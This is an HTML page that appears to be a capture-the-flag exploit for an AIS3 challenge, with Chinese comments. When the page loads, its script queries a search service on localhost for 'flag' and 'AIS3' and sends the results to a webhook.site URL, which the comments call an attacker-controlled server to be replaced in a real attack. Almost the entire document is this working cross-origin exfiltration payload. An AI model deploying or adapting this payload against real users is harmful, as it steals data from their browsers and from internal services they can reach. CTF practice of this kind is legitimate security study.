<!DOCTYPE html>
<html>
<head>
    <title>test</title>
</head>
<body>
    <h1>test in Progress...</h1>
    <div id="result"></div>
    
    <script>
        // 當頁面載入後，向目標伺服器發送請求
        window.onload = function() {
            // 嘗試搜尋包含 flag 的內容
            // 使用 "flag" 作為搜尋關鍵字來找到包含 AIS3{fake_flag} 的句子
            fetch('http://127.0.0.1:5000/search?q=flag')
                .then(response => response.json())
                .then(data => {
                    console.log('搜尋結果:', data);
                    document.getElementById('result').innerHTML = JSON.stringify(data);
                    
                    // 將結果發送到攻擊者控制的伺服器
                    // 在實際攻擊中，替換為您控制的伺服器
                    fetch('https://webhook.site/23ec46e9-3d01-4059-9ddd-8b65ad743c9a?data=' + encodeURIComponent(JSON.stringify(data)), {
                        method: 'GET',
                        mode: 'no-cors'
                    }).catch(e => console.log('外部請求失敗:', e));
                })
                .catch(error => {
                    console.error('錯誤:', error);
                    document.getElementById('result').innerHTML = 'Error: ' + error;
                });
                
            // 也可以嘗試其他搜尋關鍵字
            setTimeout(() => {
                fetch('http://127.0.0.1:5000/search?q=AIS3')
                    .then(response => response.json())
                    .then(data => {
                        console.log('AIS3 搜尋結果:', data);
                        // 處理結果...
                    });
            }, 1000);
        };
    </script>
</body>
</html>
